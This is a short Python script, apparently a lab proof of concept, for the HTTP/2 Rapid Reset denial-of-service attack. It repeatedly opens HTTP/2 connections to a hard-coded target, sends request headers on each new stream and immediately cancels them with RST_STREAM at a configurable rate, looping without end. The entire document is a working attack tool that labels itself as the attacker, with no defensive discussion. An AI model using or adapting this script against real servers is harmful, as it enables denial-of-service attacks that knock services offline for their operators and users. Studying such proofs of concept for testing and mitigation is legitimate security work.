import socket, time, sys, random
import h2.connection, h2.config

TARGET_IP = '192.168.20.10'
TARGET_PORT = 80

# 인자값으로 취소율 조절 (기본값 1.0 = 100%)
CANCEL_RATE = float(sys.argv[1]) if len(sys.argv) > 1 else 1.0

print(f'🚀 [Attacker] Single-threaded Attack Started. Cancel Rate: {CANCEL_RATE*100:.1f}%')

while True:
    try:
        raw_socket = socket.create_connection((TARGET_IP, TARGET_PORT))
        h2_conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
        h2_conn.initiate_connection()
        raw_socket.sendall(h2_conn.data_to_send())
        
        stream_id = 1
        while True:
            headers = [
                (':method', 'GET'),
                (':authority', TARGET_IP),
                (':scheme', 'http'),
                (':path', '/'),
                ('user-agent', 'RapidReset-Single-PoC')
            ]
            h2_conn.send_headers(stream_id, headers)
            
            # 설정된 확률에 따라 취소 수행
            if random.random() < CANCEL_RATE:
                h2_conn.reset_stream(stream_id, error_code=0x8)
            
            raw_socket.sendall(h2_conn.data_to_send())
            stream_id += 2
            time.sleep(0.01)
            
    except Exception:
        time.sleep(0.5)
